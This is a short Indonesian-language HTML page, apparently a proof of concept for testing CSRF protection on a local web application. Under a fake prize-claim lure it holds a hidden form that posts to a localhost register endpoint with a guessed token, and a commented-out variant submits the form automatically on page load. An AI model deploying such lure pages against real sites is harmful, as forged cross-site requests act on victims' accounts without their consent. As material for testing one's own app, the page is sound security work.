<!DOCTYPE html>
<html>
<head>
    <title>Kamu Menang Hadiah! 🎁</title>
</head>
<body>
    <h1>Selamat! Klik untuk klaim hadiah!</h1>

    <!-- Menyerang endpoint delete di aplikasi kamu -->
    <form id="evilForm" 
          action="http://localhost:8000/public/index.php?action=register" 
          method="POST">
        <input type="hidden" name="username" value="1">
        <!-- tidak tahu csrf_token, jadi kosong atau tebak -->
        <input type="hidden" name="csrf_token" value="salah_token_123">
    </form>

    <button onclick="document.getElementById('evilForm').submit()">
        Klaim Hadiah!
    </button>

    <!-- Versi auto-submit tanpa klik -->
    <!-- <body onload="document.getElementById('evilForm').submit()"> -->
</body>
</html>